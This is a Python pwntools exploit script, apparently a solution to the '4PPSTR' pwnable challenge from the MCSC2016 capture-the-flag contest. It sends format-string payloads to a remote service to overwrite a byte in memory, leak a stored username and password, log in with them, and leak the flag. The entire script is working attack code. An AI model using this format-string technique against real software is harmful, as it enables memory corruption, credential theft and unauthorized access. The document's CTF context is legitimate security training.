#!/usr/bin/python



#Abdeljalil Nouiri

#4PPSTR - Pwnable - MCSC2016 CTF
#Greetz : Azz-Eddine Djekmani & All MCSC CTF organizers


from pwn import *

con = remote("172.16.20.133",2020)


###############
USER = p32(0x0804a080)   #push sym.username ; 0x0804a080
PASS = p32(0x0804a100-1) #push sym.password ; 0x0804a100 
FLAG = p32(0x0804a180)   #push sym.flag ; 0x0804a180
###############


con.recvuntil("option:")
con.send("1\n")
paylaod = p32(0x0804a0ff)+"%64d"+"%4$hhn"
con.send(paylaod+"\n")
con.recvuntil("option:")

################
con.send("10\n")
con.recvuntil("Username:")
con.send("F\n")
con.recvuntil("Password:")
con.send("U\n")
###############


########leak username
con.recvuntil("option:")
con.send("1\n")
payload = USER+"%4$s"
con.send(payload+"\n")
getu = con.recvuntil("option: ")[5:][:-1]
username = getu.split("\n")
log.info("USER : " + username[0])

##########leak password

con.send("1\n")
payload = PASS+"%4$s"
con.send(payload+"\n")
getp = con.recvuntil("option: ")[5:][:-1]
password = getp.split("\n")
log.info("PASS : " + password[0])


################Login
con.send("10\n")
con.recvuntil("Username:")
con.send(username[0]+"\n")
con.recvuntil("Password:")
con.send(password[0]+ "\n")



###############Leak the FLAG :D
con.recvuntil("option:")
con.send("1\n")
payload = FLAG+"%4$s"
con.send(payload+"\n")
getf = con.recvuntil("option: ")[5:][:-1]
flag = getf.split("\n")
log.info("FLAG : " + flag[0])
